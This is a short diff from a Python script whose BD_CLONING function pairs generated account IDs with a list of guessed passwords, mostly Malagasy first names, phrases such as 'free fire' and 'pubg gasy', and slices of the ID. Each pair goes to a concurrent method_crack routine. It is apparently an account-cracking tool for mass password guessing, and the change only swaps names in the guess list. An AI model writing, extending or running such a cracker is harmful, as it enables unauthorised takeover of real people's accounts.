@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'mitia','Mitia','kanto','Kanto','lovasoa','Lovasoa','lova','Lova','tahiry','Tahiry','narovana','Narovana','Farakely','farakely','tafita','Tafita','Sylvain','sylvain','tinah','Tinah','larissa','Larissa','prisca','Prisca','bernadin','Bernardin','faneva','Faneva','hasina','Hasina']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanomezana','faniry','Faniry','miora','Miora','nantenaina','Nantenaina','angelina','Angelina','angelo','Angelo','ferdinand','Ferdinand','randria','Randria','Fanomezana','maman','Maman','miray','Miray','mirana','Mirana','free fire','pubg gasy','chérie','Chérie','tahiry','Tahiry','narovana','Narovana','fenosoa','Fenosoa','tafita','Tafita','Sylvain','sylvain','mahefa','Mahefa','larissa','Larissa','prisca','Prisca','bernadin','Bernardin','faneva','Faneva','hasina','Hasina']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
